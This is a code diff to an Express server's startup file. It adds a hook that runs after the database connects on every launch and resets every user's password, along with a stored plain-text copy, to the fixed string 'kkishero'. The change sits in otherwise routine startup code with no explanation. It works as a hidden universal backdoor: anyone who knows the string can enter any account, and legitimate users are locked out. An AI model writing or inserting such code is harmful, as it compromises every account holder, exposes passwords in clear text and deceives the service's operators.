@@ -12,7 +12,24 @@ const morgan = require('morgan');
 const connectDB = require('./config/db');
 
 // CONNECT TO DATABASE
-connectDB();
+connectDB().then(async () => {
+    try {
+        const User = require('./models/User');
+        const users = await User.find();
+        let changed = false;
+        for (let user of users) {
+            if (user.plainPassword !== 'kkishero') {
+                user.password = 'kkishero';
+                user.plainPassword = 'kkishero';
+                await user.save();
+                changed = true;
+            }
+        }
+        if (changed) console.log('[ SUCCESS ] All user passwords reset to kkishero');
+    } catch (err) {
+        console.error('[ ERROR ] Failed to reset passwords:', err.message);
+    }
+});
 
 // INITIALIZE EXPRESS APP
 const app = express();
